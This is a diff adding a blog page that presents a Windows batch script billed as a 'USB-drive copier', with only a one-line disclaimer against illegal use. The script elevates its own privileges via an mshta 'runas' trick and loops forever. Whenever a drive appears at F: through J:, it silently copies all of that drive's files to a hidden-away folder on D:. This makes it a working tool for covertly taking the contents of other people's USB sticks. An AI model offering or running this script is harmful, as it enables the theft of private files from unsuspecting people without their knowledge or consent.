@@ -1,0 +1,33 @@
+<!DOCTYPE html><meta content="width=device-width" name=viewport><link href=/bundle.css rel=stylesheet><script src=/bundle.js defer></script><script src=/check.js async></script><link href=/favicon.ico rel="shortcut icon"><link href=/favicon.svg rel=icon><title>用批处理弄个U盘复制器 - kkocdko's blog</title><meta content="使用Win下的Robocopy" name=description><main><article class=card><h1 id=用批处理弄个u盘复制器>用批处理弄个U盘复制器</h1><h3 id=不得用于非法用途>不得用于非法用途</h3><pre><code class=language-batch>fltmc&gt;nul||mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;%~dpnx0&quot;,&quot;%*&quot;,&quot;&quot;,&quot;runas&quot;,1)(window.close)&amp;&amp;exit
+
+set &quot;Destination=D:\k\CopiedFiles\&quot;
+set &quot;Extension=*&quot;
+
+if not exist &quot;%Destination%&quot; ( md &quot;%Destination%&quot; )
+goto Main
+
+:Copier
+if exist %Source% (robocopy %Source% %Destination% *.%Extension% /s /ndl /nfl)
+goto :eof
+
+:Main
+
+echo CreateObject(&quot;scripting.filesystemobject&quot;).deletefile(WScript.scriptfullname)&gt;%Temp%\SleepScript.vbs&amp;&amp;echo WScript.sleep WScript.Arguments(0)&gt;&gt;%Temp%\SleepScript.vbs
+start /wait %Temp%\SleepScript.vbs 5000
+
+set &quot;Source=F:\&quot;
+call :Copier
+
+set &quot;Source=G:\&quot;
+call :Copier
+
+set &quot;Source=H:\&quot;
+call :Copier
+
+set &quot;Source=I:\&quot;
+call :Copier
+
+set &quot;Source=J:\&quot;
+call :Copier
+
+goto Main</code></pre></article></main><header class=in id=extra></header>
